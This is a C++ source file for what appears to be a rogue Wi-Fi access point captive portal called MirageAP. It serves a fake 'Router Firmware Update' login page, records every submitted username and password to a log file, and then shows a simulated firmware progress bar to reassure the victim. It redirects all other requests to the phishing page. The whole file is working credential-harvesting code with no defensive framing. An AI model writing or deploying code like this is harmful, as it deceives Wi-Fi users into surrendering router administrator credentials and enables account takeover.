// MirageAP_WebServer.cpp
#include "MirageAP_WebServer.h"
#include "MirageAP_Utils.h"
#include <LittleFS.h>

WiFiServer server(80);

void MirageAP_WebServer::start() {
  server.begin();
}

void MirageAP_WebServer::handleClient() {
  WiFiClient client = server.available();
  if (!client) return;

  String reqLine = client.readStringUntil('\n');
  reqLine.trim();

  if (reqLine.startsWith("GET / ") || reqLine.startsWith("GET /index.html")) {
    // Serve login page (same as before)
    client.println("HTTP/1.1 200 OK");
    client.println("Content-Type: text/html");
    client.println("Connection: close");
    client.println();
    client.println(R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Router Firmware Update</title>
<style>
  /* Same CSS as before */
</style>
</head>
<body>
<header>Router Firmware Update</header>
<main>
  <h1>Administrator Login</h1>
  <p class="info">Please enter your credentials to continue with the firmware update.</p>
  <form method="POST" action="/login" autocomplete="off" novalidate>
    <label for="username">Username</label>
    <input id="username" name="username" type="text" required autofocus />
    <label for="password">Password</label>
    <input id="password" name="password" type="password" required />
    <button type="submit">Login</button>
  </form>
</main>
</body>
</html>
    )rawliteral");
  }
  else if (reqLine.startsWith("POST /login")) {
    // Read headers and body, parse form, log credentials, serve progress page
    while(client.connected()) {
      String headerLine = client.readStringUntil('\n');
      headerLine.trim();
      if (headerLine.length() == 0) break;
    }

    String body = "";
    while(client.available()) {
      char c = client.read();
      body += c;
    }

    int uStart = body.indexOf("username=") + 9;
    int uEnd = body.indexOf("&", uStart);
    String username = "";
    if (uStart >= 9 && uEnd > uStart) {
      username = body.substring(uStart, uEnd);
      username.replace('+', ' ');
      username = urlDecode(username);
    }

    int pStart = body.indexOf("password=") + 9;
    String passwd = "";
    if (pStart >= 9) {
      passwd = body.substring(pStart);
      passwd.replace('+', ' ');
      passwd = urlDecode(passwd);
    }

    File logFile = LittleFS.open("/log.txt", "a");
    if (logFile) {
      logFile.println(username + " tried password " + passwd);
      logFile.close();
    }

    client.println("HTTP/1.1 200 OK");
    client.println("Content-Type: text/html");
    client.println("Connection: close");
    client.println();
    client.println(R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Firmware Update</title>
<style>
  /* Same CSS as before */
</style>
<script>
  function simulateProgress() {
    const fill = document.querySelector('.progress-bar-fill');
    let width = 0;
    const interval = setInterval(() => {
      if (width >= 100) {
        clearInterval(interval);
        document.getElementById('status').textContent = 'Firmware update completed successfully.';
      } else {
        width += 2;
        fill.style.width = width + '%';
        if (width > 50) {
          document.getElementById('status').textContent = 'Installing firmware...';
        }
      }
    }, 100);
  }
  window.onload = simulateProgress;
</script>
</head>
<body>
<header>Router Firmware Update</header>
<main>
  <h1>Login Received</h1>
  <p id="status">Authenticating credentials...</p>
  <div class="progress-bar">
    <div class="progress-bar-fill"></div>
  </div>
  <p>If authentication is successful, the firmware update will begin shortly.</p>
</main>
</body>
</html>
    )rawliteral");
  }
  else {
    // Redirect all other requests to login page
    client.println("HTTP/1.1 302 Found");
    client.println("Location: http://192.168.4.1/");
    client.println("Connection: close");
    client.println();
  }

  delay(1);
  client.stop();
}
